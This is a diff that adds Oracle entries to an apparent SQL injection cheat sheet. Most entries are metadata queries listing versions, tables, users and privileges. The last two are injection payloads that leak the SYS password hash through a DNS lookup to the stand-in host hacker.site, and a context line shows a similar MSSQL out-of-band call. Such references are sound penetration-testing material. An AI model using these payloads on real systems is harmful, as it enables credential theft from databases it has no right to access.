@@ -108,7 +108,81 @@ EXEC('MASTER..XP_FILEEXIST "\\'+@host+'"');
 ```
 
 ### Oracle
-cooming soon
+
+**List database name**
+
+```
+SELECT version FROM v$instance;
+```
+```
+SELECT banner FROM v$VERSION WHERE banner LIKE 'oracle%';
+```
+```
+SELECT banner FROM GV$VERSION WHERE banner LIKE 'oracle%';
+```
+
+**List tablespace**
+
+```
+SELECT DEFAULT_TABLESPACE FROM USER_USERS;
+```
+```
+SELECT DEFAULT_TABLESPACE FROM SYS.USER_USERS;
+```
+
+**List tables and columns accessible to the current user**
+
+```
+SELECT table_name, tablespace_name FROM SYS.all_tables;
+```
+```
+SELECT table_name, tablespace_name FROM all_tables;
+```
+
+**List users**
+
+```
+SELECT user FROM DUAL;
+```
+```
+SELECT username FROM USER_USERS;
+```
+```
+SELECT username FROM ALL_USERS;
+```
+
+**List users' privileges**
+
+```
+SELECT grantee FROM DBA_ROLE_PRIVS;
+```
+```
+SELECT username FROM USER_ROLE_PRIVS;
+```
+
+**List current users' privileges**
+
+```
+SELECT role FROM SESSION_ROLES;
+```
+
+**List overview of all the dada dictionary, tables and views available**
+
+```
+SELECT * FROM DICTIONARY;
+```
+```
+SELECT * FROM DICT;
+```
+
+**Provoke DNS request **
+
+```
+SELECT UTIL_INADDR.GET_HOST_ADDRESS((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.hacker.site') FROM DUAL;-- -
+```
+```
+SELECT UTIL_INADDR.GET_HOST_NAME((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.hacker.site') FROM DUAL;-- -
+```
 
 ### MySQL
 
